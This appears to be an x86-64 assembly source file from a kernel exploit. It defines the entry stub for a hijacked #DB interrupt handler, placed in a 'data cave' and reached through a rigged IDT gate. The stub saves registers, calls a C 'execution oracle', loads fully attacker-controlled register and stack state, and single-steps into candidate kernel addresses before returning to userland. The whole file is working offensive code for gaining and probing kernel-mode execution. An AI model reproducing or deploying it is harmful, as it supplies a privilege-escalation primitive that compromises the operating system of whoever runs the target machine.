/*
 * ot_oracle_entry.S -- native #DB (vector 1) handler entry for the
 * gadget-free execution oracle.
 *
 * The CPU enters here through IDT[1] (an interrupt gate with IST set), so the
 * hardware has already switched to our controlled stack and pushed the 5-qword
 * interrupt frame [RIP,CS,RFLAGS,RSP,SS]. We save the 15 GPRs, call the
 * freestanding C handler, and dispatch on the action it returns:
 *
 *   OT_ACT_RETURN   -- restore GPRs, IRETQ (stage A: record + return).
 *   OT_ACT_STEP     -- load a fully controlled GPR/stack/RIP state and jump to
 *                      the candidate address with TF set (stage B).
 *   OT_ACT_RET_USER -- rebuild the saved user frame, restore user GPRs, IRETQ.
 *
 * No kernel gadgets are involved: the rigged gate points straight at this blob
 * and it runs entirely position-independently out of the data cave.
 *
 * ABI: int ot_oracle_c(struct ot_oracle_gregs *gregs, unsigned char *base)
 */

.intel_syntax noprefix
#include "ot_oracle_layout.h"

/* RIP-relative access to a control-block field; position-independent. */
#define P(off) [rip + ot_oracle_entry + OT_ORACLE_PARAM_OFF + off]

.section .text.ot_oracle_entry, "ax", @progbits
.global ot_oracle_entry
.type ot_oracle_entry, @function

/* Blob base marker at offset 0: link.ld pins this section first. */
ot_oracle_entry:
    push r15
    push r14
    push r13
    push r12
    push r11
    push r10
    push r9
    push r8
    push rdi
    push rsi
    push rbp
    push rbx
    push rdx
    push rcx
    push rax

    mov rbx, rsp                        /* rbx = &gregs (callee-saved) */
    mov rdi, rsp                        /* arg0 = &gregs */
    lea rsi, [rip + ot_oracle_entry]    /* arg1 = blob base VA */

    and rsp, -16
    call ot_oracle_c
    mov rsp, rbx

    test eax, eax
    jz .Lreturn
    cmp eax, OT_ACT_STEP
    je .Lstep
    cmp eax, OT_ACT_RET_USER
    je .Lret_user

.Lreturn:
    pop rax
    pop rcx
    pop rdx
    pop rbx
    pop rbp
    pop rsi
    pop rdi
    pop r8
    pop r9
    pop r10
    pop r11
    pop r12
    pop r13
    pop r14
    pop r15
    iretq

/* Load the controlled register file, switch to the controlled stack, set TF,
 * and jump to the candidate. RIP-relative loads keep this position-independent;
 * RAX is loaded like every other register and the jump reads its target from
 * the control block, so RAX can itself be a controlled gadget input. */
.Lstep:
    mov rax, P(OT_CTL_G_RAX)
    mov rcx, P(OT_CTL_G_RCX)
    mov rdx, P(OT_CTL_G_RDX)
    mov rbx, P(OT_CTL_G_RBX)
    mov rbp, P(OT_CTL_G_RBP)
    mov rsi, P(OT_CTL_G_RSI)
    mov rdi, P(OT_CTL_G_RDI)
    mov r8,  P(OT_CTL_G_R8)
    mov r9,  P(OT_CTL_G_R9)
    mov r10, P(OT_CTL_G_R10)
    mov r11, P(OT_CTL_G_R11)
    mov r12, P(OT_CTL_G_R12)
    mov r13, P(OT_CTL_G_R13)
    mov r14, P(OT_CTL_G_R14)
    mov r15, P(OT_CTL_G_R15)
    mov rsp, P(OT_CTL_RSP)
    pushfq
    or qword ptr [rsp], 0x100
    popfq
    jmp qword ptr P(OT_CTL_CANDIDATE)

/* Rebuild the user interrupt frame from the saved context, then restore the
 * user GPRs and IRETQ back to userland. */
.Lret_user:
    mov rax, P(OT_CTL_SAVED_SS)
    push rax
    mov rax, P(OT_CTL_SAVED_RSP)
    push rax
    mov rax, P(OT_CTL_SAVED_RFLAGS)
    and rax, -257                       /* clear TF */
    push rax
    mov rax, P(OT_CTL_SAVED_CS)
    push rax
    mov rax, P(OT_CTL_SAVED_RIP)
    push rax

    mov rax, P(OT_CTL_SAVED_GREGS + 0x00)
    mov rcx, P(OT_CTL_SAVED_GREGS + 0x08)
    mov rdx, P(OT_CTL_SAVED_GREGS + 0x10)
    mov rbx, P(OT_CTL_SAVED_GREGS + 0x18)
    mov rbp, P(OT_CTL_SAVED_GREGS + 0x20)
    mov rsi, P(OT_CTL_SAVED_GREGS + 0x28)
    mov rdi, P(OT_CTL_SAVED_GREGS + 0x30)
    mov r8,  P(OT_CTL_SAVED_GREGS + 0x38)
    mov r9,  P(OT_CTL_SAVED_GREGS + 0x40)
    mov r10, P(OT_CTL_SAVED_GREGS + 0x48)
    mov r11, P(OT_CTL_SAVED_GREGS + 0x50)
    mov r12, P(OT_CTL_SAVED_GREGS + 0x58)
    mov r13, P(OT_CTL_SAVED_GREGS + 0x60)
    mov r14, P(OT_CTL_SAVED_GREGS + 0x68)
    mov r15, P(OT_CTL_SAVED_GREGS + 0x70)
    iretq
.size ot_oracle_entry, .-ot_oracle_entry

.section .note.GNU-stack, "", @progbits
